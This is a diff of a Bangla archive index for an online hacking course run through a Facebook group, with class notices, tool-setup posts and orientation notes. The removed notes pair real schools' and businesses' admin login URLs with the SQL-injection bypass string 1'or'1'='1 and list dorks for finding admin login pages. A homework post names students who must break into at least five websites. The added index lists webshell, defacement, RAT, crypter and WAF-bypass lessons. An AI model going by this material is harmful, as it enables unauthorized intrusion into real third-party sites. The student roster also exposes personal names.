-## আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
+বিষয়: SQL Injection · তারিখ: 2026-08-02 · ধরন: information
 
-Date: unverified · Category: information · ID: entry-19
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-61)
 
-আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
-প্রথম অরিয়েন্টেশন ক্লাস হিসেবে সবাই অন্তত ১০ মিনিট পুর্বেই গ্রুপে উপস্থিত থাকবেন।
-ক্লাসঃ অরিয়েন্টেশন এবং প্রথম দিকের ক্লাস গুলো এই গ্রুপে লাইভ পরিচালনা করা হয়ে থাকবে। ক্লাস প্লাটফর্ম হিসেবে, গ্রুপ -সার্ভার, গুগল ক্লাসরুম এবং গুগল মিট ব্যাবহার হয়ে থাকে।
-সুতরাং, সর্ব প্রথম গ্রুপে চলে আসবেন সবাই। গ্রুপ থেকেই ক্লাস এবং সকল দিক নির্দেশনা দেওয়া হবে অরিয়েন্টেশন ক্লাসের।
-ক্লাসে দেখা হচ্ছে, ইনশাআল্লাহ।
+### entry-63 — আপনাদের হোমওয়ার্ক:
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1603860857983170)
+বিষয়: SQL Injection · তারিখ: 2026-08-02 · ধরন: documents
 
-## অরিয়েন্টেশন ক্লাসের পরবর্তী নির্দেশনা
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-63)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-63.txt)
 
-Date: unverified · Category: information · ID: entry-21
+### entry-65 — CyberFox ultimate version
 
-অনেকের জন্য একেবারে নতুন হলেও আপনাদের সাথে লাইভ orientation class করে খুব ভালো লাগলো। খুবই মজার এবং enjoyable ছিলো। আবার কথা হচ্ছে ইনশাআল্লাহ্‌।
-ধন্যবাদ সকল এডমিন এবং মডারেটরদের আমার সাথে ক্লাসে সহায়তা করার জন্য। শুভ রাত্রি।
-হোমওয়ার্ক কিভাবে করবেন, ক্লাস রেকর্ড সহ সব কিছু গ্রুপে দিয়ে দেওয়া হবে। কোন প্রশ্ন থাকলে পোষ্টে জানান, আমি উত্তর দিয়ে দিচ্ছি। ধন্যবাদ।
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: information
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604185577950698)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-65)
 
-## Orientation Class: B66 Delta
+### entry-66 — Manual SQLI practice video
 
-Date: 2026-07-19 · Category: documents · ID: entry-22
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: classes
 
-ডিরেক্ট ক্লাস রিসোর্স লিংক
-Orientation Class: B66 Delta
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-66)
 
-### Notes
+### entry-67 — যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন …
 
-Sec 1:
-—-------------------
-1. https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains
-2. https://en.wikipedia.org/wiki/Country_code_top-level_domain
-—-------------------
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-67)
 
+### entry-68 — Manual SQL Injection practice output
 
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-68)
 
+### entry-69 — প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ…
 
-2.1 —-------------------------------------------------------------------------------------------
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-69)
 
-Front end: https://www.bamesschool.com.ng/
+### entry-70 — কাল‌কে না‌কি পরীক্ষা!!
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
-Back end:  https://www.bamesschool.com.ng/secondary/admin/login.php
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-70)
 
+### entry-71 — Understanding Google dork
 
-username: password
-1'or'1'='1
-1'or'1'='1
-—-------------------------------------------------------------------------------------------
+বিষয়: Google Dork · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-71)
 
+### entry-72 — প্রিয় শিক্ষার্থীবৃন্দ,
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
-2.2 —-------------------------------------------------------------------------------------------
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-72)
 
+### entry-74 — ২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
 
-https://brahmaputradegreecollege.edu.in/dpt_login/index.php
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-74)
 
+### entry-75 — Cross Site Scripting (XSS) — Class Resource
 
+বিষয়: XSS · তারিখ: 2026-08-09 · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-75)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-75.txt)
 
+### entry-76 — Cross Site Scripting (XSS)
 
-username: password
-1'or'1'='1
-1'or'1'='1
-—-------------------------------------------------------------------------------------------
+বিষয়: XSS · তারিখ: 2026-08-09 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-76)
 
+### entry-77 — Correct Answers 1st Mid Exam CEHF
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: documents
 
-2.3 —-------------------------------------------------------------------------------------------
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-77)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/correct-answers-66-delta.pdf)
 
+### entry-78 — কি অবস্থা সবার??
 
-https://www.online.pharmaasia.com.pk/admin/login.php
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-78)
 
+### entry-81 — মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-81)
 
+### entry-83 — XSS
 
-username: password
-1'or'1'='1
-1'or'1'='1
-—-------------------------------------------------------------------------------------------
-Sec 3:
-—-------------------------------------------------------------------------------------------
-Dork = Advance search technique
-1337 / leet  - https://1337.me
-—-------------------------------------------------------------------------------------------
+বিষয়: XSS · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-83)
 
+### entry-84 — SQLi WAF
 
+বিষয়: SQL Injection · তারিখ: 2026-08-14 · ধরন: information
 
-Sec 4: 
-—-------------------------------------------------------------------------------------------
-Dork:
-ei duita te beshi kaj hobe.
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-84)
 
+### entry-86 — WAF bypass tips-
 
-inurl: admin/login.php site:.com
-inurl: admin/login.php site:.in
-inurl: admin/login.php
-inurl: admin/index.php
-inurl: admin
-inurl: login.php
-inurl: login.php site:.in
-1'or'1'='1
+বিষয়: SQL Injection · তারিখ: 2026-08-14 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-86)
 
-—-------------------------------------------------------------------------------------------
+### entry-89 — SQLi WAF — Class Resource
 
+বিষয়: WAF · তারিখ: 2026-08-14 · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-89)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-89.txt)
 
+### entry-91 — Burp Suite
 
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-91)
 
+### entry-92 — Post Based SQLi
 
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: classes
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-92)
 
+### entry-93 — বার্পসুইট ভিডিও রিসোর্স
 
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-93)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1jlVQCoMTK1qhDw5BfmuayelXAyZR2je3/view)
 
+### entry-94 — আপনাদের প্রথম মিড এক্সাম এর রেজাল্ট পাবলিশ হয়েছে। যারা ১৪ এর কম পেয়েছেন তারা আগামী ৭২ঘন্টার মধ্যে…
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-94)
 
+### entry-95 — সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
 
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-95)
 
+### entry-96 — Forensic Related Post
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-96)
 
+### entry-97 — Deface page making
 
+বিষয়: File Upload · তারিখ: 2026-08-21 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-97)
 
+### entry-98 — আসুন জেনে নেই- ৬
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-98)
 
+### entry-100 — WebShell / Backdoor concept & deface page making
 
+বিষয়: File Upload · তারিখ: 2026-08-21 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-100)
 
+### entry-101 — up_shell_fight
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-101)
 
+### entry-102 — Upload vulnerability
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: classes
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-102)
 
+### entry-103 — Webshell-B.pdf
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-103)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/webshell-b.pdf)
 
+### entry-104 — Advance WebShell
 
+বিষয়: File Upload · তারিখ: 2026-08-21 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-104)
 
+### entry-106 — Advanced Shell Resource
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-106)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1CVU48B_PTjiLMpNUzX4dLXmWfejc0_D8/view)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1DSSNWtalcz8Tuenlk-RRxneBkDG7Yvz-/view)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1wwdj8VHlfqQeYgMy72Gev0L16jh22Vsl/view)
 
+### entry-108 — Files Uploading Vulnerabilities.pdf
 
+বিষয়: File Upload · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-108)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/files-uploading-vulnerabilities.pdf)
 
+### entry-109 — FileUV.pdf
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-109)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/fileuv.pdf)
 
+### entry-110 — Portswigger
 
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-110)
 
+### entry-111 — Deepseek SSRF --BUT sandbox :(
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-111)
 
+### entry-113 — Acunetix resource file
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-113)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1fD5bqJjgQm1G2B2_FbMMKvdOwOeb6ahL/view)
 
+### entry-114 — Acunetix
 
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-Orientation Class: B66 Delta
-Date: 19/07/2026
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-114)
 
+### entry-116 — Linux Installation & Virtual Lab Setup
 
-Attendance form: https://forms.gle/49vegvDWTkNjdKB46
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: classes
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-116)
 
+### entry-118 — Batch Scripting Resource
 
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: documents
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-118)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/batch-scripting-short-notes.pdf)
 
+### entry-119 — Batch Scripting
 
-সবাই এই ফর্মে গিয়ে উপস্থিতি দিয়ে দিন।
-১। আপাতত সাউন্ড অফ আছে, লাইভ ক্লাস শুরু হচ্ছে ৯টা ৪৫ মিনিট থেকে।
-২। পোর্টালে লগিন করার প্রয়োজন নেই। আমরা পর্যায়ক্রমে পোর্টালে সংযুক্ত হবো।
-৩। গুগল ফর্ম থেকে উপস্থিতি দিয়ে দিন। সেখানে আপনার তথ্যগুলো দিয়ে সাবমিট করলে স্বয়ংক্রিয় ভাবেই attendance হয়ে যাবে এবং আপনাকে কনফার্মেশন মেসেজ দেখাবে।
-৪। উপস্থিতি দেওয়া হলে ৯ টা ৪৫ মিনিট মানে ক্লাস শুরু হওয়া পর্যন্ত অপেক্ষা করুন। ধন্যবাদ।
+বিষয়: Linux & Scripting · তারিখ: 2026-09-04 · ধরন: information
 
-- [Resource](https://docs.google.com/document/d/12U7ODuPdJCVEfEuIVt27d57fDxhtskkkT6lBZbohD2M/edit)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604086317960624)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-119)
 
-## আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
+### entry-120 — Linux installation in VMware
 
-Date: unverified · Category: information · ID: entry-23
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: tools
 
-আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
-0:00 / 3:35
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-120)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604209217948334)
+### entry-123 — Topic: Keylogger, Spyware & RAT (Live/Practical)
 
-## Basic SQLI practice video
+বিষয়: Malware Concepts · তারিখ: 2026-09-13 · ধরন: information
 
-Date: unverified · Category: information · ID: entry-24
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-123)
 
-Basic SQLI practice video
+### entry-125 — Linux CLI & Fundamental
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604211184614804)
+বিষয়: Linux & Scripting · তারিখ: 2026-09-11 · ধরন: classes
 
-## আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-125)
 
-Date: unverified · Category: documents · ID: entry-26
+### entry-127 — What is Crypter Antivirus & Virus.pdf
 
-আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
-হ্যাকিং টুলস ইন্সটলেশন সংক্রান্ত নির্দেশনা, নিয়মাবলী এবং টিউটোরিয়াল ভিডিওসহ সকল প্রয়োজনীয় তথ্য PDF ফাইলের মাধ্যমে প্রদান করা হয়েছে। অনুগ্রহ করে PDF ফাইলটি ওপেন করে টুলসগুলো সঠিকভাবে সেটআপ করে নিন।
-উল্লেখ্য
-আপনার যে কোন অসুবিধায় কমেন্টে আমাদেরকে জানাবেন সহযোগিতার জন্য ধন্যবাদ।
-drive.google.com
-Havij-guide.pdf
+বিষয়: Malware Concepts · তারিখ: যাচাই বাকি · ধরন: documents
 
-- [Resource](https://drive.google.com/file/d/1nlChC8AnaJohEdDlLf7KDLOmaBg_KYMW/view?usp=drive_link)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604955407873715)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-127)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/crypter-antivirus-virus.pdf)
 
-## হেল্প পোস্ট
+### entry-128 — Local File Inclusion (LFI)
 
-Date: unverified · Category: classes · ID: entry-27
+বিষয়: LFI / LFD · তারিখ: 2026-09-18 · ধরন: classes
 
-হেল্প পোস্ট
-গ্রুপে অনেকেই রয়েছেন যাদের সিস্টেমে মাইক্রোসফট অফিস এপ্লিকেশন সেটআপ করা নেই। সেই ক্ষেত্রে তারা গুগল ডকস এর মাধ্যমে হোমওয়ার্ক এর জন্য পিডিএফ ফাইল তৈরি করে ব্যবহার করতে পারেন। এছাড়াও
-আসুন হোম ওয়ার্ক সাবমিট করার ফুল প্রসেস টি দেখে নেই
-ধন্যবাদ ...
-0:00 / 0:00
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-128)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604211724614750)
+### entry-129 — Linux Tools & Environment Setup, Burp in kali
 
-## আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে…
+বিষয়: Linux & Scripting · তারিখ: 2026-09-20 · ধরন: classes
 
-Date: unverified · Category: information · ID: entry-28
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-129)
 
-আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে কমেন্টে জানাতে পারেন আমরা সবাই মিলে হেল্প করার চেষ্টা করব। পাশাপাশি আপনি টপিকটা ভালোভাবে বুঝে থাকলে আপনার ব্যাচমেট কেও হেল্প করতে পারেন এর উপর মার্কস ও রয়েছে।
+### entry-131 — Local File Inclusion Vulnerability(Lfi):
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604961474539775)
+বিষয়: LFI / LFD · তারিখ: যাচাই বাকি · ধরন: documents
 
-## Extra remote support session
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-131)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/web-server.pdf)
 
-Date: unverified · Category: information · ID: entry-30
+### entry-133 — আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
 
-Extra remote support session
-এখন অব্দি যারা হাবিজ সেটআপ করেননি তারা ক্লাসের পূর্বে রিমোট সাপোর্ট নিয়ে অ্যাপ্লিকেশনটা সেটআপ করে নিন। রিমোট সাপোর্টের জন্য
-ULTRAVIEWER
-অ্যাপ্লিকেশনটি ডাউনলোড করুন এবং ব্যক্তিগত নিরাপদ যোগাযোগে সহায়তা নিন।
-এপ্লিকেশন ডাউনলোড লিংক কমেন্টে পেয়ে যাবেন
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1605753791127210)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-133)
 
-## শুধুমাত্র Mac ডিভাইস এর জন্য
+### entry-135 — Java & Go commands:
 
-Date: unverified · Category: documents · ID: entry-31
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: documents
 
-শুধুমাত্র Mac ডিভাইস এর জন্য
-Havij guide
-drive.google.com
-Havij Guide for Mac.pdf
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-135)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/java-go-commands.pdf)
 
-- [Resource](https://drive.google.com/file/d/11I48kL1Y7kWJmr3pWW2mPfw5vlMMcvN0/view?usp=drive_link)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1605748737794382)
+### entry-136 — Burploader resource:
 
-## হোমওয়ার্ক আপডেট:
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: tools
 
-Date: unverified · Category: information · ID: entry-32
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-136)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/15P0WvfiBNKYdf8rVFul1wwiknBk3d5Ee/view)
 
-হোমওয়ার্ক আপডেট:
-যাদের হোম ওয়ার্ক এপ্রুভ হয়নি তারা প্যানেলে গিয়ে ডিক্লাইনের উপর ক্লিক করলেই কারণ জানতে পারবেন। যেহেতু আপনারা এই প্রথম সার্ভারে হোমওয়ার্ক সাবমিট করছেন তাই আপনাদের প্রবলেমগুলো এখানে দিয়ে দেওয়া হলো। এগুলো সল্ভ করে পুনরায় সাবমিট করুন ধন্যবাদ!
-Redwanul Islam (redwanulislam.1sec) >> আপনি ভুল ইউ আর এল সাবমিট করেছেন
-Farhan Mohmud (farhanctg006) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Md Alamin gazi (alamin7111998) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-Jahid Ahmed (ahmedjahid0097) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Sakibul Islam (sakibulislam9160) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-Rakib Hossen (designer.rakib7278) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-Md Mizanur Rahaman (biplobmdaol) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-sabuj Hossain (sabujhossain123) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-S M SHALAH UDDIN (smshalahuddin80) >> নূন্যতম পাঁচটি ওয়েবসাইট এক্সেস করে সাবমিট করবেন
-Sajib Chandra Das (sajibchandradas1998) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Ripon Mia (rezaulkarim39486) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Md : Rasheduzzaman (abir14958) >> ইউ আর এল এবং স্ক্রিনশট পিডিএফ আকারে সাবমিট করবেন
-Fahim Muntaseer (fahimmuntaseer28) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Md Rashaduzzaman (rpalash2016) >> আপনি পুনরায় হোম ওয়ার্ক সাবমিট করুন
-Faysal khan (fayshalkhan701bn) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
-Akibul islam jishan (skyblue671761) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
+### entry-137 — LFI to Rce Final
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1606489351053654)
+বিষয়: LFI / LFD · তারিখ: যাচাই বাকি · ধরন: classes
 
-## শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-137)
 
-Date: unverified · Category: tools · ID: entry-33
+### entry-138 — LFI — Not acceptable bypass
 
-শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
-সময়: ৭-৯ টা পর্যন্ত
-To join the video meeting, click this link: [মিটিং লিংক প্রকাশ করা হয়নি]
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-meet.google.com
+বিষয়: LFI / LFD · তারিখ: যাচাই বাকি · ধরন: classes
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-138)
 
-## এখনো অব্দি যারা
+### entry-139 — Advance LFI to RCE
 
-Date: unverified · Category: tools · ID: entry-34
+বিষয়: LFI / LFD · তারিখ: 2026-09-25 · ধরন: classes
 
-এখনো অব্দি যারা
-হাবিজ
-টুলস সেটাপ করতে পারেননি তারা ক্লাস এর পূর্বে সরাসরি সাপোর্ট নিয়ে টুলস সেটাপ করে নিন।
-সাপোর্ট লিংক কমেন্টে।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-139)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607868367582419)
+### entry-140 — Topic: "Web hosting Concept & Wordpress"
 
-## আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
+বিষয়: Hosting & WordPress · তারিখ: 2026-09-27 · ধরন: information
 
-Date: unverified · Category: tools · ID: entry-35
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-140)
 
-আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
-অরিয়েন্টেশন ক্লাসের মতোই গ্রুপে চলে আসবেন, সকল দিকনির্দেশনা প্রদান করা হবে।
-পাশাপাশি হোমওয়ার্ক এবং টুলস সম্পর্কিত যদি কোন সহায়তা প্রয়োজন হয়, ক্লাসের আগেই চলে আসবেন। সন্ধ্যা ৬ টা থেকে রাত ৯ টা পর্যন্ত one 2one live এক্সট্রা সাপোর্ট সেশন চলবে। গ্রুপেই তথ্য পেয়ে যাবেন। ধন্যবাদ।
+### entry-141 — LFI to RFI
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607991684236754)
+বিষয়: LFI / LFD · তারিখ: যাচাই বাকি · ধরন: classes
 
-## Extra support session will start from 6:00 PM
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-141)
 
-Date: unverified · Category: tools · ID: entry-36
+### entry-143 — Recon Part 1
 
-Extra support session will start from 6:00 PM
-Get
-Havij
-tools related support before starting the class. To join the video meeting, click this link:
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-meet.google.com
+বিষয়: Recon · তারিখ: 2026-10-02 · ধরন: classes
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607005577668698)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-143)
 
-## Join for Havij tools related support
